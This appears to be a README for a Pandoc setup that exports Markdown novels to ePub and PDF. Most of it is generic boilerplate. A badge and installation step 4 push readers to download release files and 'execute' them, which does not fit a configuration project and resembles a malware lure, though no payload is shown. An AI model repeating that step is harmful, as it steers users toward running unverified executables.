# 📚 Pandoc Novel: Your Guide to Exporting Novels

Welcome to the **Pandoc Novel** repository! This project provides a configuration for exporting your novels from Markdown to ePub and PDF formats using Pandoc. Whether you are a seasoned writer or just starting, this tool simplifies the process of formatting your work for publication.

[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-blue)](https://github.com/Madhu-Harika/pandoc-novel/releases)

## Table of Contents

1. [Introduction](#introduction)
2. [Features](#features)
3. [Getting Started](#getting-started)
4. [Usage](#usage)
5. [Configuration](#configuration)
6. [Contributing](#contributing)
7. [License](#license)
8. [Support](#support)

## Introduction

In today's digital age, writers need tools that make the publishing process easier. **Pandoc** is a powerful tool that converts documents from one format to another. This repository focuses on providing a specific configuration to help you export your novels effectively.

## Features

- **Easy Conversion**: Transform Markdown files into ePub and PDF formats with simple commands.
- **Customizable**: Modify the configuration files to fit your specific needs.
- **Lightweight**: Minimal setup required to get started.
- **Open Source**: Free to use and modify as per your requirements.

## Getting Started

To begin using this repository, you need to have Pandoc installed on your machine. You can download it from the [Pandoc website](https://pandoc.org/installing.html).

### Installation Steps

1. **Install Pandoc**: Follow the instructions on the Pandoc website to install the tool.
2. **Clone the Repository**: Use the following command to clone this repository to your local machine:

   ```bash
   git clone https://github.com/Madhu-Harika/pandoc-novel.git
   ```

3. **Navigate to the Directory**: Change into the project directory:

   ```bash
   cd pandoc-novel
   ```

4. **Download the Configuration**: Visit the [Releases](https://github.com/Madhu-Harika/pandoc-novel/releases) section to download the necessary configuration files. You will need to execute these files to set up your environment.

## Usage

Once you have everything set up, you can start converting your Markdown files. Here’s a simple command to convert a Markdown file to ePub:

```bash
pandoc your-novel.md -o your-novel.epub
```

For PDF conversion, use the following command:

```bash
pandoc your-novel.md -o your-novel.pdf
```

### Command Options

Pandoc offers various command-line options to customize your output. Some useful options include:

- `--toc`: Generates a table of contents.
- `--metadata title="Your Novel Title"`: Sets the title of your novel.
- `--css your-style.css`: Links a CSS file for ePub formatting.

## Configuration

The configuration files in this repository are designed to work seamlessly with your Markdown files. You can find the configuration files in the `config` directory. Feel free to edit them according to your preferences.

### Example Configuration

Here’s a sample configuration file for ePub:

```yaml
---
title: "Your Novel Title"
author: "Your Name"
language: "en"
---

# Chapter 1

This is the first chapter of your novel.
```

Make sure to adjust the metadata fields as needed.

## Contributing

We welcome contributions to improve this project. If you have suggestions or find bugs, please create an issue or submit a pull request. Here’s how to contribute:

1. **Fork the Repository**: Click on the fork button at the top right corner.
2. **Create a New Branch**: Use the following command:

   ```bash
   git checkout -b your-feature-branch
   ```

3. **Make Your Changes**: Edit the files as necessary.
4. **Commit Your Changes**: Use the following command:

   ```bash
   git commit -m "Add your message here"
   ```

5. **Push to Your Fork**: Push your changes back to your fork:

   ```bash
   git push origin your-feature-branch
   ```

6. **Create a Pull Request**: Go to the original repository and click on "New Pull Request."

## License

This project is licensed under the MIT License. Feel free to use, modify, and distribute this software as you see fit.

## Support

If you encounter any issues or have questions, feel free to open an issue in the repository. You can also visit the [Releases](https://github.com/Madhu-Harika/pandoc-novel/releases) section for the latest updates and files.

## Conclusion

Thank you for checking out the **Pandoc Novel** repository. We hope this tool makes your writing and publishing process smoother. Happy writing!